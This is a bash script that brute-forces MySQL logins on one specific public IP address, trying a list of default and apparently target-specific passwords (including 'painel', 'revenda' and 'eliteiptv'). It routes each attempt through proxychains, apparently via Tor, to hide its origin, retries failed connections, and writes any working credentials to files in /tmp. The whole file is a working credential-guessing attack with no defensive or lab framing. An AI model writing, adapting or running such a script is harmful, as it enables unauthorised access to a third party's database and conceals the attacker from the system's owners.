#!/bin/bash
# MySQL credential tester with Tor retry logic
HOST="186.194.52.218"
PORT=3306

CREDS=(
  "root:"
  "root:root"
  "root:admin"
  "root:mysql"
  "root:password"
  "root:toor"
  "root:123456"
  "root:12345678"
  "root:P@ssw0rd"
  "root:changeme"
  "root:painel"
  "root:elite"
  "root:revenda"
  "admin:admin"
  "admin:password"
  "admin:123456"
  "admin:admin123"
  "mysql:mysql"
  "mysql:root"
  "painel:painel"
  "painel:admin"
  "user:user"
  "test:test"
  "elite:elite"
  "eliteiptv:eliteiptv"
  "revenda:revenda"
)

for cred in "${CREDS[@]}"; do
  user=$(echo "$cred" | cut -d: -f1)
  pass=$(echo "$cred" | cut -d: -f2-)
  
  for attempt in 1 2 3; do
    result=$(timeout 15 proxychains4 mysql -h "$HOST" -P "$PORT" -u "$user" --password="$pass" --protocol tcp --batch -e "SELECT VERSION();" 2>&1 | grep -v "proxychains" | grep -v "Warning" | grep -v "^$")
    
    if echo "$result" | grep -q "ERROR 1045"; then
      echo "[-] $user:$pass -> Access denied"
      break
    elif echo "$result" | grep -q "ERROR 2003\|Can't connect"; then
      echo "[!] $user:$pass -> Connection refused (attempt $attempt), retrying..."
      sleep 5
    elif echo "$result" | grep -q "ERROR 2002"; then
      echo "[!] $user:$pass -> Socket error (attempt $attempt), retrying..."
      sleep 3
    elif [ -n "$result" ]; then
      echo "[+] SUCCESS: $user:$pass -> $result"
      echo "$result" > /tmp/mysql_success.txt
      echo "$user:$pass" > /tmp/mysql_creds_found.txt
      exit 0
    else
      echo "[!] $user:$pass -> Empty result (attempt $attempt), retrying..."
      sleep 3
    fi
  done
done

echo "[-] No valid credentials found"